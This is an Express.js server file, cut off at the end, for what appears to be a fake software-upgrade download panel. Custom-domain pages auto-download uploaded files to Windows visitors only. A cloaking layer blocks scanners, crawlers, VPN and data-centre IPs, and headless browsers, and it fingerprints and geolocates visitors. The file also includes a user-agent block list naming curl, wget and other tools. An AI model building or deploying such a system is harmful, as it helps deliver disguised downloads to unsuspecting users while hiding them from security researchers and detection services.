const express = require('express');
const session = require('express-session');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');
const dns = require('dns').promises;
const { initDb, queryAll, queryOne, runSql, rawQueryAll, rawQueryOne } = require('./db');

const app = express();
app.set('trust proxy', false);
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// File upload config
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadsDir),
  filename: (req, file, cb) => {
    const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const ext = path.extname(file.originalname);
    cb(null, unique + ext);
  }
});
const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));

// Serve React build
const clientBuild = path.join(__dirname, 'client', 'dist');
app.use(express.static(clientBuild));

// Helpers
function uid() { return Date.now().toString(36) + Math.random().toString(36).substring(2, 7); }
function today() { return new Date().toISOString().split('T')[0]; }

function requireAuth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  if (req.session.user.role !== 'Admin') return res.status(403).json({ error: 'Admin access required' });
  next();
}

function logActivity(action, details, userName) {
  runSql('INSERT INTO activity (action, details, user_name, date) VALUES (?, ?, ?, ?)', [action, details, userName, today()]);
}

// ═══════════ ANTIBOT SYSTEM ═══════════
const BOT_SECRET = crypto.randomBytes(32).toString('hex');

// In-memory stores
const rateLimitStore = new Map();
const loginAttemptStore = new Map();
const challengeTokenStore = new Map();
const ipLookupCache = new Map();
const IP_CACHE_TTL = 3600000;

// Config
const RATE_LIMITS = {
  page: { windowMs: 60000, max: 30 },
  download: { windowMs: 60000, max: 10 },
  login: { windowMs: 900000, max: 5 },
  general: { windowMs: 60000, max: 60 },
};
const LOGIN_MAX_FAILURES = 5;
const LOGIN_LOCKOUT_MS = 15 * 60 * 1000;
const CHALLENGE_TOKEN_TTL = 3600000;
const CHALLENGE_WAIT_MS = 2500;

// Cleanup expired entries every 60s
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of rateLimitStore) { if (now - v.windowStart > 120000) rateLimitStore.delete(k); }
  for (const [k, v] of loginAttemptStore) { if (v.lockUntil && now > v.lockUntil + 60000) loginAttemptStore.delete(k); }
  for (const [k, v] of challengeTokenStore) { if (now > v.expires) challengeTokenStore.delete(k); }
  for (const [k, v] of ipLookupCache) { if (now - v.timestamp > IP_CACHE_TTL) ipLookupCache.delete(k); }
}, 60000);

// Known bot UA patterns
const BOT_UA_PATTERNS = [
  /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
  /yandexbot/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i,
  /curl\//i, /wget\//i, /python-requests/i, /python-urllib/i,
  /scrapy/i, /httpclient/i, /java\//i, /libwww/i, /httpunit/i,
  /nutch/i, /phpcrawl/i, /mj12bot/i, /semrushbot/i, /ahrefsbot/i,
  /dotbot/i, /rogerbot/i, /screaming frog/i,
  /phantomjs/i, /headlesschrome/i, /puppeteer/i, /selenium/i,
  /webdriver/i, /nightmare/i,
  /postman/i, /insomnia/i, /node-fetch/i, /got\//i,
  /\bbot\b/i, /crawler/i, /spider/i, /scraper/i,
];

function getClientIp(req) {
  // Direct VPS — use real TCP connection IP, ignore x-forwarded-for (could be spoofed)
  const realIp = req.socket.remoteAddress || req.connection.remoteAddress || req.ip;
  // Normalize IPv6-mapped IPv4 (::ffff:1.2.3.4 -> 1.2.3.4)
  if (realIp && realIp.startsWith('::ffff:')) return realIp.substring(7);
  return realIp || 'unknown';
}

function isKnownBot(ua) {
  if (!ua) return true;
  return BOT_UA_PATTERNS.some(p => p.test(ua));
}

function hasHeaderAnomalies(req) {
  const ua = req.headers['user-agent'];
  const accept = req.headers['accept'];
  const lang = req.headers['accept-language'];
  const enc = req.headers['accept-encoding'];
  if (!ua) return { suspicious: true, reason: 'Missing User-Agent' };
  if (!accept && !lang) return { suspicious: true, reason: 'Missing Accept and Accept-Language headers' };
  if (accept === '*/*' && !lang && !enc) return { suspicious: true, reason: 'Generic Accept with no language/encoding' };
  return { suspicious: false };
}

function checkRateLimit(ip, routeType) {
  const cfg = RATE_LIMITS[routeType] || RATE_LIMITS.general;
  const key = ip + ':' + routeType;
  const now = Date.now();
  const record = rateLimitStore.get(key);
  if (!record || now - record.windowStart > cfg.windowMs) {
    rateLimitStore.set(key, { count: 1, windowStart: now });
    return false;
  }
  record.count++;
  if (record.count > cfg.max) return true;
  return false;
}

function signToken(payload) {
  const data = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const hmac = crypto.createHmac('sha256', BOT_SECRET).update(data).digest('base64url');
  return data + '.' + hmac;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return null;
  const [data, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', BOT_SECRET).update(data).digest('base64url');
  if (sig.length !== expected.length) return null;
  try {
    if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return null;
  } catch { return null; }
  try {
    const payload = JSON.parse(Buffer.from(data, 'base64url').toString());
    if (payload.exp && Date.now() > payload.exp) return null;
    return payload;
  } catch { return null; }
}

function logBotBlock(ip, ua, reason, blockType, reqPath) {
  runSql('INSERT INTO bot_blocks (ip, user_agent, reason, block_type, path, created) VALUES (?, ?, ?, ?, ?, ?)',
    [ip, (ua || '').substring(0, 500), reason, blockType, reqPath || '', new Date().toISOString()]
  );
}

function blockedPage(reason) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Denied</title></head>
<body style="font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
<div style="text-align:center;max-width:420px;padding:40px;background:#161922;border:1px solid #1e2230;border-radius:16px;">
<svg width="48" height="48" viewBox="0 0 24 24" fill="#ef4444" style="margin-bottom:16px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
<h1 style="font-size:1.2rem;color:#fff;margin-bottom:8px;">Access Denied</h1>
<p style="color:#94a3b8;font-size:0.85rem;">${reason}</p>
</div></body></html>`;
}

// ═══════════ IP2LOCATION ═══════════
const BLOCKED_USAGE_TYPES = new Set(['DCH', 'SES', 'RSV', 'CDN']);

function ip2locationLookup(ip) {
  return new Promise(async (resolve) => {
    const cached = ipLookupCache.get(ip);
    if (cached && Date.now() - cached.timestamp < IP_CACHE_TTL) {
      return resolve(cached.data);
    }
    const setting = await queryOne("SELECT value FROM settings WHERE key = 'ip2location_api_key'");
    if (!setting || !setting.value) return resolve(null);

    const url = 'https://api.ip2location.io/?key=' + encodeURIComponent(setting.value) + '&ip=' + encodeURIComponent(ip);
    const req = https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) { return resolve({ _error: true, _message: parsed.error.error_message || 'API error' }); }
          ipLookupCache.set(ip, { data: parsed, timestamp: Date.now() });
          resolve(parsed);
        } catch (e) {
          resolve({ _error: true, _message: 'Invalid API response' });
        }
      });
    });
    req.on('error', (err) => {
      resolve({ _error: true, _message: err.message });
    });
    req.setTimeout(10000, () => {
      req.destroy();
      resolve({ _error: true, _message: 'API timeout' });
    });
  });
}

function checkIp2locationBlock(ipData) {
  if (!ipData || !ipData.proxy) return { blocked: false, reason: null };
  const reasons = [];
  const p = ipData.proxy;
  if (p.is_vpn) reasons.push('VPN detected');
  if (p.is_tor) reasons.push('TOR detected');
  if (p.is_data_center) reasons.push('Data center IP');
  if (p.is_botnet) reasons.push('Botnet detected');
  if (p.is_scanner) reasons.push('Scanner detected');
  if (p.is_spammer) reasons.push('Spammer detected');
  if (p.is_public_proxy) reasons.push('Public proxy');
  if (p.is_web_proxy) reasons.push('Web proxy');
  if (p.is_web_crawler) reasons.push('Web crawler');
  if (ipData.usage_type && BLOCKED_USAGE_TYPES.has(ipData.usage_type)) {
    reasons.push('Blocked usage type: ' + ipData.usage_type);
  }
  return reasons.length > 0 ? { blocked: true, reason: reasons.join('; ') } : { blocked: false, reason: null };
}

function logVisitor(ip, ipData, ua, reqPath, pageId, isBlocked, blockReason) {
  runSql(
    'INSERT INTO visitor_logs (ip, country_code, country_name, region_name, city_name, latitude, longitude, isp, domain, usage_type, proxy_flags, user_agent, path, page_id, is_blocked, block_reason, created) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [
      ip,
      ipData?.country_code || null, ipData?.country_name || null,
      ipData?.region_name || null, ipData?.city_name || null,
      ipData?.latitude || null, ipData?.longitude || null,
      ipData?.isp || null, ipData?.domain || null,
      ipData?.usage_type || null,
      ipData?.proxy ? JSON.stringify(ipData.proxy) : null,
      (ua || '').substring(0, 500), reqPath || '', pageId || null,
      isBlocked ? 1 : 0, blockReason || null,
      new Date().toISOString()
    ]
  );
}

function challengePageHtml(nonce, originalUrl) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{text-align:center;max-width:440px;padding:48px 40px;background:#161922;border:1px solid #1e2230;border-radius:16px}
.spinner{width:48px;height:48px;border:4px solid #1e2230;border-top:4px solid #818cf8;border-radius:50%;margin:0 auto 24px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:1.15rem;color:#fff;margin-bottom:8px}
p{color:#94a3b8;font-size:0.85rem;margin-bottom:20px}
.progress{width:100%;height:4px;background:#1e2230;border-radius:4px;overflow:hidden}
.bar{height:100%;width:0%;background:linear-gradient(90deg,#818cf8,#6366f1);border-radius:4px;transition:width 3s linear}
.fail{color:#ef4444;display:none;margin-top:16px;font-size:0.85rem}
.hp{position:absolute;left:-9999px;opacity:0;height:0}
</style></head><body>
<div class="card">
<div class="spinner" id="spinner"></div>
<h1 id="status-text">Verifying your browser...</h1>
<p>This is an automatic security check. Please wait.</p>
<div class="progress"><div class="bar" id="bar"></div></div>
<input type="text" name="website" id="hp_website" class="hp" tabindex="-1" autocomplete="off">
<p class="fail" id="fail-msg">Verification failed. Please try again later.</p>
</div>
<script>
(function(){
var startTime=Date.now();
var nonce="${nonce}";
var origUrl="${originalUrl.replace(/"/g, '\\"')}";
document.getElementById("bar").style.width="100%";
var checks={
webdriver:navigator.webdriver===true,
phantom:!!window._phantom||!!window.phantom,
nightmare:!!window.__nightmare,
selenium:!!document.documentElement.getAttribute("webdriver"),
headless:/HeadlessChrome/.test(navigator.userAgent),
pluginsZero:navigator.plugins.length===0,
langEmpty:!navigator.languages||navigator.languages.length===0
};
var fp={
sw:screen.width,sh:screen.height,cd:screen.colorDepth,
tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
tzo:new Date().getTimezoneOffset(),
lang:navigator.language,
langs:(navigator.languages||[]).join(","),
plat:navigator.platform,
cookie:navigator.cookieEnabled,
tp:navigator.maxTouchPoints||0,
mem:navigator.deviceMemory||0,
cores:navigator.hardwareConcurrency||0
};
setTimeout(function(){
var honeypot=document.getElementById("hp_website").value;
var payload={nonce:nonce,elapsed:Date.now()-startTime,checks:checks,fp:fp,honeypot:honeypot};
var xhr=new XMLHttpRequest();
xhr.open("POST","/api/bot-verify",true);
xhr.setRequestHeader("Content-Type","application/json");
xhr.onload=function(){
if(xhr.status===200){
try{var r=JSON.parse(xhr.responseText);
if(r.ok){document.getElementById("status-text").textContent="Verified. Redirecting...";
document.getElementById("spinner").style.borderTopColor="#22c55e";
setTimeout(function(){window.location.href=origUrl||window.location.href;},500);
}else{showFail();}}catch(e){showFail();}
}else{showFail();}
};
xhr.onerror=function(){showFail();};
xhr.send(JSON.stringify(payload));
},3000);
function showFail(){
document.getElementById("status-text").textContent="Verification Failed";
document.getElementById("spinner").style.borderTopColor="#ef4444";
document.getElementById("spinner").style.animationPlayState="paused";
document.getElementById("fail-msg").style.display="block";
}
})();
</script></body></html>`;
}

// Bot guard middleware
async function botGuard(req, res, next) {
  // Only protect public page/download routes and custom domain requests
  const isPageRoute = req.path.startsWith('/page/') || req.path.startsWith('/download/');
  const host = req.hostname;
  const isDomainRoute = host !== 'localhost' && host !== '127.0.0.1' &&
    !req.path.startsWith('/api/') && !req.path.startsWith('/uploads/') &&
    !req.path.startsWith('/assets/') && !req.path.startsWith('/user') && !req.path.startsWith('/admin') && !req.path.startsWith('/login');

  if (!isPageRoute && !isDomainRoute) return next();

  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';

  // 1. IP allowlist
  const allowed = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'allow']);
  if (allowed) return next();

  // 2. IP blocklist
  const blocked = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'block']);
  if (blocked) {
    logBotBlock(ip, ua, 'IP blocklisted', 'ip_blocklist', req.path);
    return res.status(403).send(blockedPage('Your IP has been blocked.'));
  }

  // 3. Known bot UA
  if (isKnownBot(ua)) {
    logBotBlock(ip, ua, 'Known bot User-Agent: ' + ua.substring(0, 100), 'ua_blocked', req.path);
    return res.status(403).send(blockedPage('Automated access is not allowed.'));
  }

  // 4. Header anomalies
  const anomaly = hasHeaderAnomalies(req);
  if (anomaly.suspicious) {
    logBotBlock(ip, ua, anomaly.reason, 'header_anomaly', req.path);
    return res.status(403).send(blockedPage('Request blocked due to suspicious headers.'));
  }

  // 5. Rate limiting
  const routeType = req.path.startsWith('/download/') ? 'download' : 'page';
  if (checkRateLimit(ip, routeType)) {
    logBotBlock(ip, ua, 'Rate limit exceeded (' + routeType + ')', 'rate_limited', req.path);
    return res.status(429).send(blockedPage('Too many requests. Please slow down.'));
  }

  // 6. Check challenge token cookie
  const tokenCookie = req.headers.cookie && req.headers.cookie.split(';').find(c => c.trim().startsWith('_bc_token='));
  if (tokenCookie) {
    const token = tokenCookie.split('=')[1];
    const payload = verifyToken(token);
    if (payload && payload.ip === ip) return next();
  }

  // 7. Serve challenge page
  const nonce = crypto.randomBytes(16).toString('hex');
  const originalUrl = req.originalUrl || req.url;
  challengeTokenStore.set(nonce, { ip, originalUrl, expires: Date.now() + 300000 });
  return res.status(200).send(challengePageHtml(nonce, originalUrl));
}

app.use(botGuard);

// Login brute force guard
function loginGuard(req, res, next) {
  const ip = getClientIp(req);
  const record = loginAttemptStore.get(ip);
  if (record && record.lockUntil && Date.now() < record.lockUntil) {
    logBotBlock(ip, req.headers['user-agent'], 'Brute force lockout', 'brute_force', req.path);
    return res.status(429).json({ error: 'Too many failed attempts. Try again in 15 minutes.' });
  }
  if (checkRateLimit(ip, 'login')) {
    logBotBlock(ip, req.headers['user-agent'], 'Login rate limit', 'rate_limited', req.path);
    return res.status(429).json({ error: 'Too many requests. Slow down.' });
  }
  next();
}

// Windows-only detection
function isWindows(userAgent) {
  if (!userAgent) return false;
  return /windows/i.test(userAgent);
}

function windowsOnlyPage() {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Windows Only</title></head>
<body style="font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0e1a;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
<div style="text-align:center;max-width:480px;padding:40px;background:#161922;border:1px solid #1e2230;border-radius:16px;">
<svg width="64" height="64" viewBox="0 0 24 24" fill="#818cf8" style="margin-bottom:20px;"><path d="M3 12V6.75l6-1.32v6.48L3 12zm17-9v8.75l-10 .08V5.21L20 3zM3 13l6 .09v6.81l-6-1.15V13zm7 .18l10 .08V21l-10-1.84V13.18z"/></svg>
<h1 style="font-size:1.4rem;color:#fff;margin-bottom:12px;">Windows Only</h1>
<p style="color:#94a3b8;font-size:0.95rem;line-height:1.6;">This software upgrade is for Windows computers only. Please switch to a Windows computer to access the software.</p>
</div></body></html>`;
}

// Shared page renderer
async function renderPage(page, res) {
  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [page.id]);
  const isLink = activeVersion && activeVersion.link_url;
  const downloadUrl = activeVersion ? (isLink ? activeVersion.link_url : '/download/' + page.id) : '';
  const fileName = activeVersion ? (isLink ? activeVersion.link_url : (activeVersion.original_name || activeVersion.file_name)) : '';
  const version = activeVersion ? activeVersion.version : '';

  let html = page.html_code;
  html = html.replace(/\{\{download_url\}\}/g, downloadUrl);
  html = html.replace(/\{\{file_name\}\}/g, fileName);
  html = html.replace(/\{\{version\}\}/g, version);
  html = html.replace(/\{\{app_name\}\}/g, page.name || '');

  if (downloadUrl) {
    if (isLink) {
      // External link — redirect after delay
      const safeUrl = downloadUrl.replace(/"/g, '&quot;').replace(/\\/g, '\\\\');
      const autoRedirect = '<script>window.addEventListener("load",function(){setTimeout(function(){window.location.href="' + safeUrl + '";},1000);});<\/script>';
      html = html.replace('</body>', autoRedirect + '</body>');
    } else {
      // File download
      const safeFileName = fileName.replace(/"/g, '');
      const autoDownload = '<script>window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("a");a.href="' + downloadUrl + '";a.download="' + safeFileName + '";document.body.appendChild(a);a.click();document.body.removeChild(a);},1000);});<\/script>';
      html = html.replace('</body>', autoDownload + '</body>');
    }
  }

  res.send(html);
}

// Domain-based routing middleware
app.use(async (req, res, next) => {
  const host = req.hostname;
  if (host === 'localhost' || host === '127.0.0.1' || req.path.startsWith('/api/') || req.path.startsWith('/uploads/') || req.path.startsWith('/assets/')) return next();

  const domainRecord = await queryOne('SELECT d.page_id, p.id as pid, p.html_code, p.name, p.status FROM domains d LEFT JOIN pages p ON d.page_id = p.id WHERE d.domain = ?', [host]);
  if (!domainRecord || !domainRecord.page_id || !domainRecord.html_code) return next();

  // Windows-only check
  if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());

  await renderPage(domainRecord, res);
});

// ═══════════ BOT VERIFY ═══════════
app.post('/api/bot-verify', async (req, res) => {
  const { nonce, elapsed, checks, fp, honeypot } = req.body;
  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';

  // Validate nonce
  const stored = challengeTokenStore.get(nonce);
  if (!stored || stored.ip !== ip) {
    logBotBlock(ip, ua, 'Invalid nonce', 'challenge_fail', '');
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }
  const storedPath = stored.originalUrl || '';
  challengeTokenStore.delete(nonce);

  // Check honeypot
  if (honeypot) {
    logBotBlock(ip, ua, 'Honeypot filled', 'honeypot', storedPath);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Check elapsed time
  if (!elapsed || elapsed < CHALLENGE_WAIT_MS) {
    logBotBlock(ip, ua, 'Challenge completed too fast (' + elapsed + 'ms)', 'challenge_fail', storedPath);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Calculate suspicion score from headless checks
  let score = 0;
  if (checks) {
    if (checks.webdriver) score += 30;
    if (checks.phantom) score += 30;
    if (checks.nightmare) score += 30;
    if (checks.selenium) score += 30;
    if (checks.headless) score += 25;
    if (checks.pluginsZero) score += 10;
    if (checks.langEmpty) score += 15;
  }

  if (score >= 30) {
    const flags = Object.entries(checks || {}).filter(([,v]) => v).map(([k]) => k).join(', ');
    logBotBlock(ip, ua, 'Headless flags: ' + flags + ' (score: ' + score + ')', 'challenge_fail', storedPath);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // IP2Location final check
  try {
    const ipData = await ip2locationLookup(ip);

    if (ipData === null) {
      // No API key configured — skip IP2L, rely on existing layers
    } else if (ipData._error) {
      // API failed — fail-closed, block visitor
      logBotBlock(ip, ua, 'IP lookup unavailable: ' + ipData._message, 'ip2location', storedPath);
      logVisitor(ip, null, ua, storedPath, null, true, 'IP lookup unavailable');
      return res.status(403).json({ ok: false, reason: 'Verification failed' });
    } else {
      const ipCheck = checkIp2locationBlock(ipData);
      if (ipCheck.blocked) {
        logVisitor(ip, ipData, ua, storedPath, null, true, ipCheck.reason);
        logBotBlock(ip, ua, ipCheck.reason, 'ip2location', storedPath);
        return res.status(403).json({ ok: false, reason: 'Verification failed' });
      }
      // Clean visitor — log it
      logVisitor(ip, ipData, ua, storedPath, null, false, null);
    }
  } catch (err) {
    // Fail-closed on unexpected error
    logBotBlock(ip, ua, 'IP lookup error: ' + err.message, 'ip2location', storedPath);
    return res.status(403).json({ ok: false, reason: 'Verification failed' });
  }

  // Issue signed token cookie
  const token = signToken({ ip, exp: Date.now() + CHALLENGE_TOKEN_TTL });
  res.setHeader('Set-Cookie', '_bc_token=' + token + '; Path=/; HttpOnly; SameSite=Strict; Max-Age=3600');
  res.json({ ok: true });
});

// ═══════════ BOT ADMIN API ═══════════
app.get('/api/bot-stats', requireAdmin, async (req, res) => {
  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
  const todayStr = today();
  const blockedToday = await queryOne('SELECT COUNT(*) as c FROM bot_blocks WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
  const byType = await queryAll('SELECT block_type, COUNT(*) as count FROM bot_blocks GROUP BY block_type ORDER BY count DESC');
  const topIps = await queryAll('SELECT ip, COUNT(*) as count FROM bot_blocks GROUP BY ip ORDER BY count DESC LIMIT 10');
  const blocklisted = await queryOne('SELECT COUNT(*) as c FROM bot_ip_list WHERE list_type = ?', ['block']) || { c: 0 };
  res.json({ total: total.c, today: blockedToday.c, byType, topIps, blocklisted: blocklisted.c });
});

app.get('/api/bot-blocks', requireAdmin, async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;
  const total = await queryOne('SELECT COUNT(*) as c FROM bot_blocks') || { c: 0 };
  const blocks = await queryAll('SELECT * FROM bot_blocks ORDER BY id DESC LIMIT ? OFFSET ?', [limit, offset]);
  res.json({ blocks, total: total.c, page, limit });
});

app.get('/api/bot-ip-list', requireAdmin, async (req, res) => {
  const list = await queryAll('SELECT * FROM bot_ip_list ORDER BY id DESC');
  res.json(list);
});

app.post('/api/bot-ip-list', requireAdmin, async (req, res) => {
  const { ip, listType, note } = req.body;
  if (!ip || !listType) return res.status(400).json({ error: 'IP and list type required' });
  if (!['allow', 'block'].includes(listType)) return res.status(400).json({ error: 'Invalid list type' });

  const existing = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, listType]);
  if (existing) return res.status(400).json({ error: 'IP already in ' + listType + ' list' });

  await runSql('INSERT INTO bot_ip_list (ip, list_type, note, created) VALUES (?, ?, ?, ?)',
    [ip, listType, note || '', new Date().toISOString()]
  );
  logActivity('Bot IP ' + (listType === 'block' ? 'Blocked' : 'Allowed'), ip, req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/bot-ip-list/:id', requireAdmin, async (req, res) => {
  const entry = await queryOne('SELECT * FROM bot_ip_list WHERE id = ?', [req.params.id]);
  if (!entry) return res.status(404).json({ error: 'Entry not found' });

  await runSql('DELETE FROM bot_ip_list WHERE id = ?', [req.params.id]);
  logActivity('Bot IP Removed', entry.ip + ' from ' + entry.list_type + ' list', req.session.user.name);
  res.json({ ok: true });
});

app.delete('/api/bot-blocks', requireAdmin, async (req, res) => {
  await runSql('DELETE FROM bot_blocks', []);
  logActivity('Bot Logs Cleared', 'All block logs cleared', req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ VISITOR LOGS ADMIN API ═══════════
app.get('/api/visitor-stats', requireAdmin, async (req, res) => {
  const total = await queryOne('SELECT COUNT(*) as c FROM visitor_logs') || { c: 0 };
  const uniqueIps = await queryOne('SELECT COUNT(DISTINCT ip) as c FROM visitor_logs') || { c: 0 };
  const blocked = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE is_blocked = 1') || { c: 0 };
  const todayStr = today();
  const todayCount = await queryOne('SELECT COUNT(*) as c FROM visitor_logs WHERE created LIKE ?', [todayStr + '%']) || { c: 0 };
  const topCountries = await queryAll('SELECT country_code, country_name, COUNT(*) as count FROM visitor_logs WHERE country_code IS NOT NULL GROUP BY country_code, country_name ORDER BY count DESC LIMIT 10');
  const topCities = await queryAll('SELECT city_name, country_code, COUNT(*) as count FROM visitor_logs WHERE city_name IS NOT NULL GROUP BY city_name, country_code ORDER BY count DESC LIMIT 10');
  const topIsps = await queryAll('SELECT isp, COUNT(*) as count FROM visitor_logs WHERE isp IS NOT NULL GROUP BY isp ORDER BY count DESC LIMIT 10');
  const blockReasons = await queryAll('SELECT block_reason, COUNT(*) as count FROM visitor_logs WHERE is_blocked = 1 AND block_reason IS NOT NULL GROUP BY block_reason ORDER BY count DESC LIMIT 10');
  res.json({ total: total.c, uniqueIps: uniqueIps.c, blocked: blocked.c, today: todayCount.c, topCountries, topCities, topIsps, blockReasons });
});

app.get('/api/visitor-logs', requireAdmin, async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;
  const where = [];
  const params = [];
  let paramIdx = 0;
  if (req.query.country) { paramIdx++; where.push('country_code = $' + paramIdx); params.push(req.query.country); }
  if (req.query.blocked === 'true') { where.push('is_blocked = 1'); }
  else if (req.query.blocked === 'false') { where.push('is_blocked = 0'); }
  if (req.query.from) { paramIdx++; where.push('created >= $' + paramIdx); params.push(req.query.from); }
  if (req.query.to) { paramIdx++; where.push('created <= $' + paramIdx); params.push(req.query.to + 'T23:59:59'); }
  const whereClause = where.length > 0 ? 'WHERE ' + where.join(' AND ') : '';
  const totalRow = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs ' + whereClause, params) || { c: 0 };
  paramIdx++;
  paramIdx++;
  const logs = await rawQueryAll('SELECT * FROM visitor_logs ' + whereClause + ' ORDER BY id DESC LIMIT $' + (paramIdx - 1) + ' OFFSET $' + paramIdx, [...params, limit, offset]);
  res.json({ logs, total: totalRow.c, page, limit });
});

app.delete('/api/visitor-logs', requireAdmin, async (req, res) => {
  await runSql('DELETE FROM visitor_logs', []);
  logActivity('Visitor Logs Cleared', 'All visitor logs cleared', req.session.user.name);
  res.json({ ok: true });
});

// ═══════════ AUTH ═══════════
app.post('/api/auth/login', loginGuard, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

  const user = await queryOne('SELECT * FROM users WHERE email = ?', [email]);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  if (user.status !== 'Active') return res.status(403).json({ error: 'Account is inactive' });
  if (!bcrypt.compareSync(password, user.password)) {
    // Track failed login attempt
    const ip = getClientIp(req);
    const record = loginAttemptStore.get(ip) || { count: 0 };
    record.count++;
    if (record.count >= LOGIN_MAX_FAILURES) {
      record.lockUntil = Date.now() + LOGIN_LOCKOUT_MS;
      logBotBlock(ip, req.headers['user-agent'], 'Too many failed logins (' + record.count + ')', 'brute_force', '/api/auth/login');
    }
    loginAttemptStore.set(ip, record);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Clear login attempts on success
  loginAttemptStore.delete(getClientIp(req));

  req.session.user = { id: user.id, name: user.name, email: user.email, role: user.role };
  logActivity('Login', user.name + ' logged in', user.name);
  res.json({ user: req.session.user });
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy();
  res.json({ ok: true });
});

app.get('/api/auth/me', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  res.json({ user: req.session.user });
});

// ═══════════ USERS (Admin) ═══════════
app.get('/api/users', requireAdmin, async (req, res) => {
  const users = await queryAll('SELECT id, name, email, role, status, created FROM users ORDER BY created DESC');
  res.json(users);
});

app.post('/api/users', requireAdmin, async (req, res) => {
  const { name, email, password, role, status } = req.body;
  if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password required' });

  const existing = await queryOne('SELECT id FROM users WHERE email = ?', [email]);
  if (existing) return res.status(400).json({ error: 'Email already exists' });

  const id = uid();
  const hash = bcrypt.hashSync(password, 10);
  await runSql('INSERT INTO users (id, name, email, password, role, status, created) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [id, name, email, hash, role || 'User', status || 'Active', today()]
  );
  logActivity('User Created', 'Created user: ' + name, req.session.user.name);
  res.json({ id, name, email, role: role || 'User', status: status || 'Active', created: today() });
});

app.put('/api/users/:id', requireAdmin, async (req, res) => {
  const { name, email, role, status, password } = req.body;
  const user = await queryOne('SELECT * FROM users WHERE id = ?', [req.params.id]);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const updates = { name: name || user.name, email: email || user.email, role: role || user.role, status: status || user.status };

  if (email && email !== user.email) {
    const dup = await queryOne('SELECT id FROM users WHERE email = ? AND id != ?', [email, req.params.id]);
    if (dup) return res.status(400).json({ error: 'Email already exists' });
  }

  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    await runSql('UPDATE users SET name=?, email=?, password=?, role=?, status=? WHERE id=?',
